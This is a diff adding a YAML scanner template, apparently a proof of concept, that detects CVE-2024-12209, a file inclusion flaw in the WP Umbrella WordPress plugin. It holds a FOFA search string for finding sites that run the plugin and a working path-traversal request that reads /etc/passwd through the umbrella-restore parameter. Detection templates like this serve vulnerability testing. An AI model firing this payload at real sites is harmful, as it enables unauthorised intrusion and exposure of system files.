@@ -1,0 +1,19 @@
+id: poc-yaml-wp-plugin-umbrella-update-backup-restore-and-monitoring-file-inclusion
+info:
+  name: WordPress 插件 Umbrella 更新备份恢复和监控 文件包含漏洞(CVE-2024-12209)
+  severity: high
+  tags:
+  - lfi
+  - CVE-2024-12209
+  finger: wp-umbrella
+  fofa: body="/wp-content/plugins/wp-health"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/wp-content/plugins/wp-health")
+- method: GET
+  path: /?umbrella-restore=1&filename=../../../../../../etc/passwd
+  expression: "status_code == 200 && \nmatches(body,\"root:.*:0:0\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(content_type,\"text/html\")\n"
+variables: {}
+transport: http
